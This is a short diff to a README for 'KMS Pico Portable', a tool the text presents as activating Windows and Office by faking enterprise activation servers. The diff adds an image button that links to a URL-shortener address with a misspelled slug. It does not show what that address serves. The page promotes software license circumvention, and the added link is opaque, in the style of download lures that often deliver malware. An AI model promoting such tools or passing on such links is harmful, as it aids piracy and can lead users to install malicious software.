@@ -1,6 +1,8 @@
 # KMS Pico Portable
 **KMS Pico Portable** is a standalone tool that activates Microsoft Windows and Office by simulating enterprise activation infrastructure directly on personal computers.
 
+[![6735735683456789](https://github.com/user-attachments/assets/55faf4b4-f11f-4a80-9140-f76257e9c096)](https://y.gy/kms-pico-porrtable)
+
 
 
 **Operational Process:**
